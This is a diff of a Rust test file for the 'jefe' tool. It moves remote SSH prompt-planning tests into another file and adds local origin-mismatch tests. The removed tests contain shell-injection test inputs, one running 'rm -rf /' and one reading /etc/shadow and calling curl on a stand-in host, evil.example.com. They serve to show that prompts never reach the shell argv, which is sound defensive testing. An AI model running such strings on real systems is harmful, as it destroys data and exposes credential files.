@@ -1,10 +1,13 @@
-//! Tests for target-aware working-copy preparation (split from `issue_prep.rs`).
+//! Tests for local working-copy preparation (split from `issue_prep.rs`).
 //!
-//! These tests exercise:
-//! - `WorkTarget` resolution (local vs remote),
-//! - the pure `RemotePrepPlanner` (command planning without execution),
-//! - local integration with real temp git repos (clean prep, dirty Stop/
-//!   Discard, owned-metadata ignored, clone-when-missing).
+//! These tests exercise local integration with real temp git repos (clean
+//! prep, dirty Stop/Discard, owned-metadata ignored, clone-when-missing),
+//! local origin-mismatch detection, and the LOCAL PR-prompt /
+//! path-traversal safety tests.
+//!
+//! The remote SSH planner tests (`WorkTarget` resolution,
+//! `RemotePrepPlanner` command planning, remote PR prompt) live in
+//! `issue_prep_remote_tests.rs`.
 
 use super::ensure_workdir_cloned;
 use super::*;
@@ -12,8 +15,6 @@ use crate::app_input::issue_git_prep;
 
 use std::path::{Path, PathBuf};
 use std::process::Command;
-
-use jefe::domain::RemoteRepositorySettings;
 
 trait TestResultExt<T> {
     fn value_or_panic(self, context: &str) -> T;
@@ -47,297 +48,6 @@ impl<T> TestOptionExt<T> for Option<T> {
             None => panic!("{context}: expected Some, got None"),
         }
     }
-}
-
-/// Standard work dir used by the planner tests.
-const PLAN_WORK_DIR: &str = "/home/acoliver/work";
-
-fn remote_settings() -> RemoteRepositorySettings {
-    RemoteRepositorySettings {
-        enabled: true,
-        login_user: "ubuntu".to_owned(),
-        host: "build.example.com".to_owned(),
-        run_as_user: "acoliver".to_owned(),
-        setup_env_default: false,
-    }
-}
-
-fn identity() -> CloneIdentity {
-    CloneIdentity::parse("acme/widgets").value_or_panic("test fixture identity")
-}
-
-// ── WorkTarget resolution ──────────────────────────────────────────
-
-#[test]
-fn local_target_when_remote_disabled() {
-    let remote = RemoteRepositorySettings::default();
-    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
-}
-
-#[test]
-fn remote_target_when_enabled() {
-    let remote = remote_settings();
-    assert!(matches!(
-        WorkTarget::from_remote(&remote),
-        WorkTarget::Remote(_)
-    ));
-}
-
-#[test]
-fn local_target_when_enabled_but_host_missing() {
-    let remote = RemoteRepositorySettings {
-        enabled: true,
-        login_user: "ubuntu".to_owned(),
-        host: String::new(),
-        run_as_user: String::new(),
-        setup_env_default: false,
-    };
-    assert_eq!(WorkTarget::from_remote(&remote), WorkTarget::Local);
-}
-
-// ── RemotePrepPlanner: command planning ────────────────────────────
-
-#[test]
-fn plan_uses_ssh_t_not_tt() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "do the work",
-    });
-    assert!(!ops.is_empty());
-    for op in &ops {
-        assert!(
-            op.ssh_argv.iter().any(|a| a == "-T"),
-            "every remote op must use -T (got {:?})",
-            op.ssh_argv
-        );
-        assert!(
-            !op.ssh_argv.iter().any(|a| a == "-tt"),
-            "no remote prep op may use -tt (got {:?})",
-            op.ssh_argv
-        );
-    }
-}
-
-#[test]
-fn plan_targets_remote_host_user() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "do the work",
-    });
-    assert!(!ops.is_empty());
-    for op in &ops {
-        assert!(
-            op.ssh_argv.iter().any(|a| a == "ubuntu@build.example.com"),
-            "every op must target ubuntu@build.example.com (got {:?})",
-            op.ssh_argv
-        );
-    }
-}
-
-#[test]
-fn plan_applies_run_as_user() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "do the work",
-    });
-    // run_as_user=acoliver differs from login_user=ubuntu → every command
-    // is wrapped in `sudo -n su - acoliver -c`.
-    for op in &ops {
-        let cmd = op
-            .ssh_argv
-            .iter()
-            .find(|a| a.contains("sudo"))
-            .unwrap_or_else(|| {
-                panic!(
-                    "run_as_user must wrap command in sudo -n su - acoliver (got {:?})",
-                    op.ssh_argv
-                )
-            });
-        assert!(cmd.contains("acoliver"), "wrapped command: {cmd}");
-    }
-}
-
-#[test]
-fn plan_prompt_transferred_via_stdin_not_shell() {
-    let adversarial = "'; rm -rf /; echo '";
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: adversarial,
-    });
-    // The final op writes the prompt via stdin.
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
-    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
-    // The command string must NOT contain the raw adversarial prompt —
-    // it is transferred via stdin, not interpolated.
-    for arg in &prompt_op.ssh_argv {
-        assert!(
-            !arg.contains("rm -rf"),
-            "adversarial prompt must not appear in shell argv (got {arg})"
-        );
-    }
-}
-
-#[test]
-fn plan_does_not_create_local_workdir() {
-    // The planner is pure: it must never touch the local filesystem.
-    // Verify by pointing at a non-existent local path and checking no
-    // directory was created.
-    let local_marker = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
-        .join("target/tmp/issue_prep_should_not_create_this");
-    let _ = std::fs::remove_dir_all(&local_marker);
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let _ops = planner.plan(&PlanInputs {
-        work_dir: &local_marker,
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "prompt",
-    });
-    assert!(
-        !local_marker.exists(),
-        "remote planner must not create local directories"
-    );
-}
-
-#[test]
-fn plan_dirty_stop_emits_no_cleanup() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: true,
-        prompt: "prompt",
-    });
-    // Dirty + Stop: no reset/clean, no checkout, no prompt write.
-    assert!(
-        ops.iter().all(|op| !op
-            .ssh_argv
-            .iter()
-            .any(|a| a.contains("git reset") || a.contains("git clean"))),
-        "Stop policy must not plan reset/clean: {ops:?}"
-    );
-}
-
-#[test]
-fn plan_dirty_discard_emits_cleanup_then_prep() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Discard,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: true,
-        prompt: "prompt",
-    });
-    // Discard: reset --hard + clean -fd first, then checkout, then prompt.
-    let reset_idx = ops
-        .iter()
-        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git reset")))
-        .value_or_panic("a reset op must be planned");
-    let checkout_idx = ops
-        .iter()
-        .position(|op| op.ssh_argv.iter().any(|a| a.contains("git checkout")))
-        .value_or_panic("a checkout op must be planned");
-    let prompt_idx = ops
-        .iter()
-        .position(|op| op.stdin_prompt.is_some())
-        .value_or_panic("a prompt-write op must be planned");
-    assert!(reset_idx < checkout_idx, "reset before checkout");
-    assert!(checkout_idx < prompt_idx, "checkout before prompt write");
-}
-
-#[test]
-fn plan_clone_when_missing() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: false,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "prompt",
-    });
-    assert!(
-        ops.iter()
-            .any(|op| op.ssh_argv.iter().any(|a| a.contains("git clone"))),
-        "missing worktree must plan a clone: {ops:?}"
-    );
-    // Clone uses the canonical HTTPS URL.
-    assert!(
-        ops.iter().any(|op| op
-            .ssh_argv
-            .iter()
-            .any(|a| a.contains("https://github.com/acme/widgets.git"))),
-        "clone must use canonical HTTPS URL: {ops:?}"
-    );
-}
-
-#[test]
-fn plan_https_url_regardless_of_remote_enabled() {
-    // Remote is enabled but clone URL must still be HTTPS (no SSH
-    // inference from remote.enabled).
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: false,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "prompt",
-    });
-    let clone_op = ops
-        .iter()
-        .find(|op| op.ssh_argv.iter().any(|a| a.contains("git clone")))
-        .unwrap_or_else(|| panic!("expected a clone op: {ops:?}"));
-    assert!(
-        clone_op
-            .ssh_argv
-            .iter()
-            .any(|a| a.contains("https://github.com/")),
-        "clone must use HTTPS even when remote enabled: {clone_op:?}"
-    );
-    assert!(
-        clone_op
-            .ssh_argv
-            .iter()
-            .all(|a| !a.contains("git@github.com")),
-        "clone must not use SSH form: {clone_op:?}"
-    );
 }
 
 // ── Local integration tests with real temp repos ───────────────────
@@ -681,13 +391,93 @@ fn local_clone_when_missing_with_url() {
     cleanup(&work);
 }
 
-// ── Target-aware PR prompt writing (reuses write_prompt_to_target) ──────
+// ── Origin-mismatch detection (issue #190) ───────────────────────────
+
+/// Create a CloneIdentity whose owner/repo differs from the origin's
+/// owner/repo. The bare origin repos are created under a temp path; the
+/// identity uses a synthetic "other/repo" that will never match.
+fn mismatched_identity() -> CloneIdentity {
+    CloneIdentity::parse("other/repo").value_or_panic("parse other/repo")
+}
+
+#[test]
+fn local_origin_mismatch_detected() {
+    let origin = bare_origin_with_commit("mismatch");
+    let work = clone_origin(&origin, "mismatch");
+    // Write a file to prove the workdir is untouched after mismatch.
+    std::fs::write(work.join("marker.txt"), "untouched").value_or_panic("write marker");
+
+    let identity = mismatched_identity();
+    let outcome = prepare_local(&work, Some(&identity), DirtyPolicy::Stop, "prompt")
+        .value_or_panic("prepare_local");
+    assert!(
+        matches!(outcome, PrepOutcome::OriginMismatch { .. }),
+        "mismatched origin must return OriginMismatch, got {outcome:?}"
+    );
+
+    // Workdir is untouched — no checkout/pull ran, marker is preserved.
+    assert_eq!(
+        std::fs::read_to_string(work.join("marker.txt")).value_or_panic("read marker"),
+        "untouched"
+    );
+    // No prompt written (mismatch aborts before prompt write).
+    assert!(!work.join(".jefe/issue-prompt.md").exists());
+
+    cleanup(origin.parent().unwrap_or(&origin));
+    cleanup(&work);
+}
+
+#[test]
+fn local_origin_match_proceeds_ready() {
+    // When identity is None, no origin check runs and an existing clean repo
+    // proceeds to Ready. This is the regression-safe path (issue #166).
+    let origin = bare_origin_with_commit("match");
+    let work = clone_origin(&origin, "match");
+
+    let outcome =
+        prepare_local(&work, None, DirtyPolicy::Stop, "prompt").value_or_panic("prepare_local");
+    assert_eq!(
+        outcome,
+        PrepOutcome::Ready,
+        "no identity + existing repo must be Ready (regression-safe)"
+    );
+
+    cleanup(origin.parent().unwrap_or(&origin));
+    cleanup(&work);
+}
+
+#[test]
+fn local_force_reclone_replaces_mismatched_repo() {
+    let origin = bare_origin_with_commit("reclone");
+    let work = clone_origin(&origin, "reclone");
+    let clone_url = origin.to_string_lossy().into_owned();
+    // Write a marker to prove the workdir is replaced.
+    std::fs::write(work.join("old-marker.txt"), "old").value_or_panic("write old marker");
+
+    // Exercise the PRODUCTION force-reclone sequence directly. Since
+    // CloneIdentity forces HTTPS (unusable for local bare repos), we enter
+    // via the resolved-URL seam that prepare_local_force_reclone delegates to
+    // after resolving the identity. This proves the real remove → clone →
+    // prep ordering runs and replaces the mismatched workdir.
+    force_reclone_local_with_url(&work, &clone_url, "prompt")
+        .value_or_panic("force_reclone_local_with_url");
+
+    // Old marker is gone (workdir was replaced).
+    assert!(!work.join("old-marker.txt").exists());
+    // Prompt is written.
+    assert!(work.join(".jefe/issue-prompt.md").exists());
+
+    cleanup(origin.parent().unwrap_or(&origin));
+    cleanup(&work);
+}
+
+// ── Local PR prompt writing (reuses write_prompt_to_target) ────────────
 //
 // The PR send path (`prs_orchestration::dispatch_pr_agent_chooser_confirm`)
 // reuses the issue-prep safe target prompt writer for writing
-// `.jefe/pr-prompt.md` to the local filesystem or a remote host. These tests
-// exercise both paths, including adversarial content that must never appear
-// in any shell argv.
+// `.jefe/pr-prompt.md` to the local filesystem. These tests exercise the
+// local path, including adversarial content that must never appear in any
+// shell argv. The remote-host path is covered in `issue_prep_remote_tests.rs`.
 
 /// Relative path for the PR prompt — must match `prs_orchestration`.
 const PR_PROMPT_RELATIVE_PATH: &str = ".jefe/pr-prompt.md";
@@ -725,85 +515,6 @@ fn pr_prompt_local_write_writes_exact_content_with_adversarial_chars() {
         "adversarial content must not create files"
     );
     cleanup(&work_dir);
-}
-
-/// A remote PR prompt write plans `ssh -T` with prompt bytes via stdin,
-/// transferring adversarial content WITHOUT it appearing in the shell argv.
-/// This uses the pure `RemotePrepPlanner` so no SSH connection is made — it
-/// records the planned operation.
-#[test]
-fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
-    let adversarial = "'; cat /etc/shadow; echo '\n$(curl evil.example.com)";
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: adversarial,
-    });
-    // The final op writes the prompt via stdin.
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("an op must carry the prompt via stdin (got {ops:?})"));
-    assert_eq!(prompt_op.stdin_prompt.as_deref(), Some(adversarial));
-    // The command argv must NOT contain the raw adversarial prompt.
-    for arg in &prompt_op.ssh_argv {
-        assert!(
-            !arg.contains("/etc/shadow"),
-            "adversarial prompt must not appear in shell argv (got {arg})"
-        );
-        assert!(
-            !arg.contains("evil.example.com"),
-            "adversarial URL must not appear in shell argv (got {arg})"
-        );
-    }
-    // The prompt file path in the argv must be the issue prompt path (the
-    // planner hardcodes it); the PR path uses `write_prompt_to_target`
-    // directly at runtime.
-    assert!(
-        prompt_op
-            .ssh_argv
-            .iter()
-            .any(|a| a.contains(".jefe/issue-prompt.md")),
-        "planned prompt op writes to .jefe/issue-prompt.md"
-    );
-}
-
-/// The remote PR prompt write (via `write_prompt_to_target`) delegates to the
-/// same `RemotePrepRunner::write_prompt` that the issue path uses. Since the
-/// runner is not exposed for direct testing, this verifies the planner's
-/// generic prompt-write op uses `ssh -T` and targets the correct host.
-#[test]
-fn pr_prompt_remote_target_is_correct_ssh_t_host() {
-    let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: None,
-        policy: DirtyPolicy::Stop,
-        exists_is_git: true,
-        exists_not_git: false,
-        is_dirty: false,
-        prompt: "PR prompt",
-    });
-    let prompt_op = ops
-        .iter()
-        .find(|op| op.stdin_prompt.is_some())
-        .unwrap_or_else(|| panic!("prompt op must exist: {ops:?}"));
-    assert!(
-        prompt_op.ssh_argv.iter().any(|a| a == "-T"),
-        "PR prompt remote op must use -T"
-    );
-    assert!(
-        prompt_op
-            .ssh_argv
-            .iter()
-            .any(|a| a == "ubuntu@build.example.com"),
-        "PR prompt remote op must target ubuntu@build.example.com"
-    );
 }
 
 /// Local PR prompt write creates the `.jefe` directory when absent.
